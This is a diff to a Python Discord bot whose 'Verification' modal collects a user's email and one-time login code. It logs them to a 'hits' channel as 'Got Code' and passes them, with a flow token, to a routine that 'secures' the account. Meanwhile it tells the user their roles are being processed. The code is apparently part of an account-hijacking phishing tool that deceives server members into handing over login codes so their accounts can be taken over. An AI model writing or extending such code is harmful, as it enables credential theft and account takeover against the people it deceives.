@@ -1,13 +1,14 @@
 from discord import ui
 import datetime
 import discord
-import asyncio
+import httpx
 import json
 
-from views.buttons.buttonOptions import ButtonOptions
+from views.buttons.embedOptions import ButtonOptions
 from views.buttons.accountInfo import accountInfo
 
 from views.utils.startSecure import startSecuringAccount
+from views.utils.initialSession import getSession
 
 config = json.load(open("config.json", "r+"))
 
@@ -32,7 +33,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
         Code_embed = discord.Embed(
-            title = f"{interaction.user.name} | {interaction.user.id}",
+            title = f"User | {interaction.user.name}",
             description=f"**Email** | **Status**\n```{self.email} | Got Code | {self.box_three.value}```",
             timestamp = datetime.datetime.now(),
             colour = 0x79D990,                           
@@ -40,14 +41,16 @@ class MyModalTwo(ui.Modal, title="Verification"):
 
         await interaction.response.defer()
 
-        await logs_channel.send("**This Account is being automaticly secured**")
+        await logs_channel.send("**This Account is being automaticly secured.**")
         await logs_channel.send(embed = Code_embed, view = ButtonOptions(interaction.user.id))
 
         await interaction.followup.send(
             "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
         )
 
-        finalEmbeds = await startSecuringAccount(self.email, self.flowtoken, self.box_three.value)
+        self.session = getSession()
+
+        finalEmbeds = await startSecuringAccount(self.session, self.email, self.flowtoken, self.box_three.value)
         
         if not finalEmbeds:
 
